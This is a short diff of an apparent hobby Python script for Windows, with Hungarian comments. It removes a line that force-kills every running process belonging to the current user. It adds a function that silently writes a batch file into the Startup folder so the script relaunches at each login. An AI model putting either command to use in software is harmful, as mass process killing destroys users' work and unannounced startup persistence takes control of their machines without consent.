@@ -90,7 +90,19 @@ try:
 except Exception as e:
     pass # Ezt írd ide, hogy ne legyen piros!
     
-os.system('taskkill /F /FI "STATUS eq RUNNING" /FI "USERNAME eq %USERNAME%" /T')
+
+def set_startup():
+    # Megkeressük a Startup mappát
+    startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+    bat_fajl = os.path.join(startup_mappa, "indit_oopa.bat")
+    
+    if not os.path.exists(bat_fajl):
+        try:
+            with open(bat_fajl, "w") as f:
+                # Ez a sor megmondja a Windowsnak: Használd a pythont az oopa.py megnyitásához
+                f.write(f'start "" python "{os.path.abspath(sys.argv[0])}"')
+        except:
+            pass
 
 import os
 import shutil
